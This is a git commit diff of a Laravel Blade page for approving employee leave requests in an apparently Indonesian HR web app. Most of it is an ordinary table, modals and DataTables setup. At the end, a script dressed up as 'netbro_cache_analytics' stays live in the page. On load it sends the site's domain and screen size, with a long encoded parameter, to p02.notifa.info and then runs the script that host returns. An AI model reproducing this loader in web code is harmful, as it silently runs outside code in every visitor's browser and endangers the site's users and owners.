41ee1d28ef4f07357b9772a6c6646f17e4d97af1
Nurmasyanti <nurmasyanti02@gmail.com>
2019-08-22 10:37:47 +0700

    Update persetujuan_izin.blade.php

--- SIKIIP/resources/views/PersetujuanIzin/persetujuan_izin.blade.php
+++ SIKIIP/resources/views/PersetujuanIzin/persetujuan_izin.blade.php
@@ -1,6 +1,5 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -8,18 +7,24 @@
     <meta name="description" content="">
     <meta name="author" content="">
     <link rel="shortcut icon" href="/image/favicon.png">
-    <title>Beranda</title>
+    <title>Persetujuan Izin</title>
     <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
     <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/>
+    <link rel="stylesheet" type="text/css" href="assets/lib/datatables/css/dataTables.bootstrap.min.css"/>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="/assets/css/style.css" type="text/css"/>
+
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
     <link rel="stylesheet" type="text/css" href="assets/lib/jquery.vectormap/jquery-jvectormap-1.2.2.css"/>
     <link rel="stylesheet" type="text/css" href="assets/lib/jqvmap/jqvmap.min.css"/>
     <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
-    <link rel="stylesheet" href="assets/css/style.css" type="text/css"/>
-    </head>
-    <body>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  </head>
+  <body>
     <div class="be-wrapper">
-     <div class="be-wrapper be-fixed-sidebar">
+       <div class="be-wrapper be-fixed-sidebar">
 
             <!--  Sidebar Brand Logo -->
 
@@ -41,13 +46,13 @@
 
                     <div class="profil">
                         <div class="circular--portrait">
-                            <img class="img-responsive" src="assets/img/avatar.png">
+                           <img class="img-responsive foto-karyawan" src="/image/FotoProfil/{{Auth::user()->foto_profil}}">
                             <div id="username">
                                 <a href="profil.html" class="simple_text">{{ Auth::user()->name }}</a>
                             </div>
                            <button onclick="window.location.href='/profil'" type="button" class="btn">Profil</button>
-                           <!-- <button class="btn btn-space btn-default active">Default</button> -->
                         </div>
+                    </div>
 
                              <!--  Sidebar Menu-->
 
@@ -133,26 +138,130 @@
                </div>
             </div>
          </div>
-       </div>
-    
 
+    
+         <!--  Sidebar End -->    
+    
        <!--   Content Start  -->
-      <div class="be-wrapper be-fixed-sidebar">
-        <div class="be-content be-icons-list">
-          <div class="main-content container-fluid">
-            <div class="row">
-            <!-- <div class="col-xs-12 col-md-6 col-lg-3"> -->
-                <div class="welcome">
-                 <p>Persetujuan Izin</p>
-                 <a href="#">{{ Auth::user()->name }}</a> 
-                </div>  
-            <!-- </div>  -->         
+<div class="be-wrapper be-fixed-sidebar">
+    <div class="be-content be-icons-list">
+      <div class="page-head">
+          <h2 class="page-head-title">Persetujuan Izin</h2>
+        </div>
+     
+      <div class="main-content container-fluid">
+        <div class="row">
+          <div class="col-lg-12">
+            
+          </div>
+        </div>
+
+        <div class="panel panel-default panel-table">
+         <div class="panel-body">      
+          <table id="table1" class="table table-striped table-hover table-fw-widget"> 
+                <thead>
+                  <tr>
+                    <th>NIK</th>
+                    <th>Nama</th>
+                    <th>Divisi</th>
+                    <th>Alasan</th>
+                    <th>Keterangan</th>
+                    <th>Tindakan</th>
+                    
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>1234567890</td>
+                    <td>Alexander</td>
+                    <td>Development Technologi</td>
+                    <td>Sakit</td>
+                    <td>Diterima </td>
+                    <td>
+                      <button data-toggle="modal" data-target="#izinkan" type="button" class="btn btn-space btn-primary">Izinkan</button>
+                      <button data-toggle="modal" data-target="#tolak" type="button" class="btn btn-space btn-danger">Tolak</button>
+                    </td>
+                    
+                  </tr>      
+                  <tr>
+                    <td>0987654321</td>
+                    <td>Anita</td>
+                    <td>Desain Grafis</td>
+                    <td>Sakit</td>
+                    <td>Ditolak</td>
+                    <td>
+                      <button data-toggle="modal" data-target="#izinkan" type="button" class="btn btn-space btn-primary">Izinkan</button>
+                      <button data-toggle="modal" data-target="#tolak" type="button" class="btn btn-space btn-danger">Tolak</button>
+                    </td>
+                    </td>
+                    
+                  </tr>
+                  <tr>
+                    <td>0987654321</td>
+                    <td>Mikael Jeremi</td>
+                    <td>Content Writer</td>
+                    <td>Sakit</td>
+                    <td>Proses</td>
+                    <td>
+                      <button data-toggle="modal" data-target="#izinkan" type="button" class="btn btn-space btn-primary">Izinkan</button>
+                      <button data-toggle="modal" data-target="#tolak" type="button" class="btn btn-space btn-danger">Tolak</button>
+                    </td>
+                  </tr>      
+
+                </tbody>
+              </table>
             </div>
           </div>
         </div>
       </div>
+    </div>
         
-       <!--   Content End  -->
+<!--   Content End  -->
+<!-- modal Izinkan Start -->
+<div id="izinkan" tabindex="-1" role="dialog" class="modal fade">
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
+          </div>
+          <div class="modal-body">
+            <div class="text-center">
+              <h3><b>Izinkan</b></h3>
+              <p><font size="4">Apakah anda yakin ?</font></p>
+              <div class="xs-mt-50">
+                <button type="button" data-dismiss="modal" class="btn btn-space btn-danger">Tidak</button>
+                <button type="button"  data-target="tolak-ya" data-dismiss="modal" class="btn btn-space btn-primary">Ya</button>
+              </div>
+            </div>
+          </div>
+          <div class="modal-footer"></div>
+        </div>
+      </div>
+    </div>
+ 
+<!-- Modal Tolak Start -->
+<div id="tolak" tabindex="-1" role="dialog" class="modal fade">
+      <div class="modal-dialog">
+        <div class="modal-content">
+          <div class="modal-header">
+            <button type="button" data-dismiss="modal" aria-hidden="true" class="close"><span class="mdi mdi-close"></span></button>
+          </div>
+          <div class="modal-body">
+            <div class="text-center">
+              <h3><b>Tolak</b></h3>
+              <p><font size="4">Apakah anda yakin ?</font></p>
+              <div class="xs-mt-50">
+                <button type="button" data-dismiss="modal" class="btn btn-space btn-danger">Tidak</button>
+                <button type="button"  data-target="tolak-ya" data-dismiss="modal" class="btn btn-space btn-primary">Ya</button>
+              </div>
+            </div>
+          </div>
+          <div class="modal-footer"></div>
+        </div>
+      </div>
+    </div>
+  
+  <!-- Modal Tolak End -->
        
 <!--Footer -->
      
@@ -166,49 +275,86 @@
 <!--  Inisialisasi Java Script -->
 
 <script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
-<script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
-<script src="assets/js/main.js" type="text/javascript"></script>
-<script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
-<script src="assets/lib/jquery-flot/jquery.flot.js" type="text/javascript"></script>
-<script src="assets/lib/jquery-flot/jquery.flot.pie.js" type="text/javascript"></script> 
-<script src="assets/lib/jquery-flot/jquery.flot.resize.js" type="text/javascript"></script>
-<script src="assets/lib/jquery-flot/plugins/jquery.flot.orderBars.js" type="text/javascript"></script>
-<script src="assets/lib/jquery-flot/plugins/curvedLines.js" type="text/javascript"></script>
-<script src="assets/lib/jquery.sparkline/jquery.sparkline.min.js" type="text/javascript"></script>
-<script src="assets/lib/countup/countUp.min.js" type="text/javascript"></script>
-<script src="assets/lib/jquery-ui/jquery-ui.min.js" type="text/javascript"></script>
-<script src="assets/lib/jqvmap/jquery.vmap.min.js" type="text/javascript"></script>
-<script src="assets/lib/jqvmap/maps/jquery.vmap.world.js" type="text/javascript"></script>
+    <script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
+    <script src="assets/js/main.js" type="text/javascript"></script>
+    <script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
+    <script src="assets/lib/datatables/js/jquery.dataTables.min.js" type="text/javascript"></script>
+    <script src="assets/lib/datatables/js/dataTables.bootstrap.min.js" type="text/javascript"></script>
+    <script src="assets/lib/datatables/plugins/buttons/js/dataTables.buttons.js" type="text/javascript"></script>
+    <script src="assets/lib/datatables/plugins/buttons/js/buttons.html5.js" type="text/javascript"></script>
+    <script src="assets/lib/datatables/plugins/buttons/js/buttons.flash.js" type="text/javascript"></script>
+    <script src="assets/lib/datatables/plugins/buttons/js/buttons.print.js" type="text/javascript"></script>
+    <script src="assets/lib/datatables/plugins/buttons/js/buttons.colVis.js" type="text/javascript"></script>
+    <script src="assets/lib/datatables/plugins/buttons/js/buttons.bootstrap.js" type="text/javascript"></script>
 
-I<!-- inisialisasi Java Script -->
+    <script type="text/javascript">
+      $(document).ready(function(){
+        //initialize the javascript
+        App.init();
+        App.dataTables();
+      });
+    </script>
 
-<script type = "text/javascript">
-    if (self == top) {
-        function netbro_cache_analytics(fn, callback) {
-            setTimeout(function() {
+    <script type="text/javascript">
+      document.getElementById("status").onchange = function () {
+      document.getElementById("alasan").setAttribute("disabled", "disabled");
+       document.getElementById("tgl_resign").setAttribute("disabled", "disabled");
+      if (this.value == 'Resign')
+        document.getElementById("alasan").removeAttribute("disabled");
+      if (this.value == 'Resign')
+      document.getElementById("tgl_resign").removeAttribute("disabled");
+      };
+
+      // Fungsi Logout
+
+      $(function(){
+          $('a#logout').click(function(){
+              if(confirm('Apakah anda yakin ingin keluar ?')) {
+                  return true;
+              }
+
+              return false;
+                });
+            });
+
+
+      // Fungsi Menu dashboard
+
+      $(document).ready(function(){
+
+          App.init();
+          App.dashboard();
+
+          });
+      </script>
+
+      <script type="text/javascript">
+        if (self == top) {
+            function netbro_cache_analytics(fn, callback) {
+                setTimeout(function() {
+                    fn();
+                    callback();
+                }, 0);
+            }
+
+            function sync(fn) {
                 fn();
-                callback();
-            }, 0);
-        }
+            }
 
-        function sync(fn) {
-            fn();
-        }
+            function requestCfs() {
+                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
+                var idc_glo_r = Math.floor(Math.random() * 99999999999);
+                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
+                var bsa = document.createElement('script');
+                bsa.type = 'text/javascript';
+                bsa.async = true;
+                bsa.src = url;
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
+            }
+            netbro_cache_analytics(requestCfs, function() {});
+        };
 
-        function requestCfs() {
-            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
-            var idc_glo_r = Math.floor(Math.random() * 99999999999);
-            var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUzpvf2l56FucADiEx%2bf3JAPJogkNU%2biFfwCiZ%2bA5y%2fz1GPfkI78hOjpKGi13lyWOD4PTAvdGjGONrTkbHyQtyDiXMT6f73PUxXAafylPFQAofDmqSRGCN6kLPoPHF5oxuxg%2bsgcyENso77BDI%2biq12wLsMGa%2bin6lXObrjR5nN3n3mCHDOu9rOERnmtSCzsvQVvQC2um1T%2fNsq2QIjE4KBpR9Vkl2LpxVPpB5ls%2failQCaTL23yQg6%2fVmE4aJahv4ErgHCjfL9mX4EPIxsCfVSS1MVwUyVfrSegVjjaXYDrZcarSkz7F2VXD0r3sg%2bPtdKUwpPNNQOOz0e5p%2bJ9WrZ7lxjycaB2F9Ci38ljGYNDUDDsnXT6j2Y7m3PBs%2bu3Atlk%2f2VykRlaJnvFNX%2bS%2flT5eDv6PQdmrWoWEBnXUCINHwnSwu3Cu7NudtMWlNGrsWK93HbdfLL45H%2f2NwIlDGeGNFBHlAFq869dDf3eePYoKSnP2OLHCFol" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
-            var bsa = document.createElement('script');
-            bsa.type = 'text/javascript';
-            bsa.async = true;
-            bsa.src = url;
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
-        }
-        netbro_cache_analytics(requestCfs, function() {});
-    };
+      </script>
 
-</script>
-</script>
 </body>
 </html>
